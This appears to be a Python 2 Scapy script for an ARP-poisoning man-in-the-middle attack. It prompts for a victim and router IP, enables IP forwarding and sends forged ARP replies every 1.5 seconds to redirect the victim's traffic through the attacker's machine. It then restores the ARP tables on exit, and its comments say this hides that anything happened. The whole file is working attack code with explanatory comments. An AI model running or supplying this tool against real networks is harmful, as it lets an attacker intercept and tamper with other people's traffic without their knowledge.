from scapy.all import *
import sys
import os
import time

"""Ask the user for an interface, victim IP address, and the router
   IP address. Add exception just in case the user doesn't want to
   continue. Enable IP forwarding so they don't have to do it.
"""
try:
    interface = raw_input("Enter desired interface: ")
    victimIP = raw_input("Enter victim IP address: ")
    gateIP = raw_input("Enter router IP address: ")
except KeyboardInterrupt:
    print "\nUser requested shutdown"
    print "Exiting..."
    sys.exit(1)

print "\nEnabling IP forwarding...\n"
os.system("sudo sysctl -w net.inet.ip.forwarding=1")

"""In order to create ARP responses, we need the victim and router MAC
   addresses. We do this by making ARP requests and returning the result.
   We send an ARP request with the destination of the user's choice."""
def get_mac_address(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, i_face = interface, inter = 0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

"""Once the attack is over, we need to re-assign the target's address
   so they know where to send their information. If this is not done
   then it will be obvious something has happened. We find the MAC address
   and it sends replies out telling the systems where the other system is.
   We send each reply seven times for good measure. Once we have done that
   we disable IP forwarding for the user."""
def re_ARP():
    print "\nRestoring targets..."
    victimMAC = get_mac_address(victimIP)
    gateMAC = get_mac_address(gateIP)
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
    print "Disabling IP forwarding..."
    os.system("sudo sysctl -w net.inet.ip.forwarding=0")
    print "Shutting down..."
    sys.exit(1)

"""Our simplest, but most important. We send a single ARP reply to each
   of the targets telling them that we are the other target, placing
   ourselves in between them."""
def deceive(gm, vm):
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = vm))
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = gm))

"""Main function: We try to get the victim and router MAC addresses in
   case of failure. If we can't find one of them we disable IP forwarding
   and we shut down the script. If we do get the MAC address then we can
   send our replies every 1.5 seconds. Once the user gives a keyboard interrupt
   (Ctrl+C), we call the re_ARP() function to re-assign the targets and
   shut down the script."""
def mitm():
    try:
        victimMAC = get_mac_address(victimIP)
    except Exception:
        os.system("sudo sysctl -w net.inet.ip.forwarding=1")
        print "Could NOT find Victim MAC address!"
        print "Exiting..."
        sys.exit(1)
    try:
        gateMAC = get_mac_address(gateIP)
    except Exception:
        os.system("sudo sysctl -w net.inet.ip.forwarding=0")
        print "Could NOT find gateway MAC address"
        print "Exiting..."
        sys.exit(1)
    print "Poisoning targets..."

    while 1:
        try:
            deceive(gateMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            re_ARP()
            break

mitm()

"""Testing: """